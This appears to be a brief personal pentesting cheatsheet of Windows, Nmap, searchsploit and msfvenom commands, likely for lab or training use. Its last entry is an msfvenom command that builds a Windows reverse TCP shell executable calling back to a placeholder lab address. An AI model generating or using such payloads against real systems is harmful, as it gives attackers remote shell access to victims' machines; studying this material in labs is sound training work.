# Lessons Learned
This is my cheatsheet of key commands, strings, TTPS, etc. that keep popping up over and over.

## Windows
- Change directory: ```cd```
- List contents of directory: ```dir```

## Linux

## Nmap
- Nmap Scripts are stored in ```/usr/share/nmap/scripts```

## Searchsploit
- To copy from searchsploit: ```searchsploit [exploit num] -x```

## MSFVenom
- Windows Reverse TCP Shell w/ No Bad Chars: ```msfvenom -p windows/shell_reverse_tcp LHOST=10.10.XX.XX LPORT=4444 -f exe > shell.exe```
